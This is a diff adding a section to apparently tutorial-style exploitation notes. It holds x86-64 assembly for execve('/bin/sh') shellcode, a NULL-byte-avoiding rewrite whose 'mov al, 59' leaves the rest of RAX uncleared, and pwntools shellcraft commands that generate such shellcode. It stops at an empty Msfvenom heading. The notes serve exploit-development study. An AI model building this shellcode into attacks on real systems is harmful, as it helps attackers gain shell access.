@@ -237,6 +237,67 @@ Check if have NULL byte:
 print("%d bytes - Found NULL byte" % len(shellcode)) if [i for i in shellcode if i == 0] else print("%d bytes - No NULL bytes" % len(shellcode))
 ```
 
+# 3.Shellcode Tools
+
+## 3.1 shell shellcode
+
+```assembly
+global _start
+
+section .text
+_start:
+    mov rax, 59         ; execve syscall number
+    push 0              ; push NULL string terminator
+    mov rdi, '/bin//sh' ; first arg to /bin/sh
+    push rdi            ; push to stack 
+    mov rdi, rsp        ; move pointer to ['/bin//sh']
+    push 0              ; push NULL string terminator
+    push rdi            ; push second arg to ['/bin//sh']
+    mov rsi, rsp        ; pointer to args
+    mov rdx, 0          ; set env to NULL
+    syscall
+```
+
+Having this kind of code which is execve,`/bin//sh`is used to fullfil the register to avoid the `\00`.We can recode it as following to avoid `\00`:
+
+```assembly
+global _start
+
+section .text
+_start:
+    mov al, 59         ; execve syscall number
+    xor rdx,rdx
+    push rdx              ; push NULL string terminator
+    mov rdi, '/bin//sh' ; first arg to /bin/sh
+    push rdi            ; push to stack
+    mov rdi, rsp        ; move pointer to ['/bin//sh']
+    push rdx              ; push NULL string terminator
+    push rdi            ; push second arg to ['/bin//sh']
+    mov rsi, rsp        ; pointer to args
+    xor rdx,rdx          ; set env to NULL
+    syscall
+```
+
+## 3.2 Shellcraft
+
+Let's start with our usual tools, `pwntools`, and use its `shellcraft` library, which generates a shellcode for various `syscalls`. We can list `syscalls` the tool accepts as follows:
+
+```bash
+pwn shellcraft -l "amd64"
+pwn shellcraft amd64.linux.sh
+```
+
+also
+
+```python
+from pwn import *
+context(os="linux", arch="amd64", log_level="error")
+syscall = shellcraft.execve(path='/bin/sh',argv=['/bin/sh'])  
+print(asm(syscall).hex())
+```
+
+## 3.3 Msfvenom
+
 
 
 
